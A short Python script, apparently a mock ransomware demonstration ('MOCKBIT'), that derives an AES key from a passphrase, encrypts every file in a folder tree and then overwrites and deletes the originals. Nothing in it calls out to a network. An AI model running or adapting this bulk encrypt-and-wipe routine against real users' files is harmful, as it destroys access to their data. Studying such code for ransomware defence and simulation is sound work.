import os
import json
import base64
import getpass
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2

# Zielordner anpassen!
START_PATH = "folder"
KEY_FILENAME = "MOCKBIT_KEY.txt"
NONCE_SIZE = 12  # Bytes for AES-GCM nonce
SALT_SIZE = 16  # Bytes for PBKDF2 salt
PBKDF2_ITERATIONS = 200_000



def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    nonce = get_random_bytes(NONCE_SIZE)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ct_bytes, tag = cipher.encrypt_and_digest(data)
    with open(file_path + ".mock", "wb") as f:
        f.write(nonce + tag + ct_bytes)
    secure_delete(file_path)

def secure_delete(path):
    """Overwrite the file with random bytes before removing it."""
    try:
        length = os.path.getsize(path)
        with open(path, "wb") as f:
            f.write(get_random_bytes(length))
            f.flush()
            os.fsync(f.fileno())
    except Exception as e:
        print("Sicheres Löschen fehlgeschlagen für", path, e)
    finally:
        try:
            os.remove(path)
        except Exception:
            pass

def find_and_encrypt_all_files(path, key):
    for dirpath, _, files in os.walk(path):
        for name in files:
            file_path = os.path.join(dirpath, name)
            if name.endswith(".mock") or name == KEY_FILENAME:
                continue
            try:
                encrypt_file(file_path, key)
                print("Verschlüsselt:", file_path)
            except Exception as e:
                print("Fehler bei", file_path, e)

if __name__ == "__main__":
    passphrase = getpass.getpass("Bitte Passphrase zum Verschlüsseln eingeben:\n")
    salt = get_random_bytes(SALT_SIZE)
    key = PBKDF2(passphrase, salt, dkLen=32, count=PBKDF2_ITERATIONS)

    key_path = os.path.join(START_PATH, KEY_FILENAME)
    key_info = {
        "salt": base64.b64encode(salt).decode(),
        "iterations": PBKDF2_ITERATIONS,
    }
    with open(key_path, "w") as f:
        json.dump(key_info, f)
    print(f"Parameter wurden in {key_path} gespeichert. Passphrase merken!")
    find_and_encrypt_all_files(START_PATH, key)
    print("Fertig.")
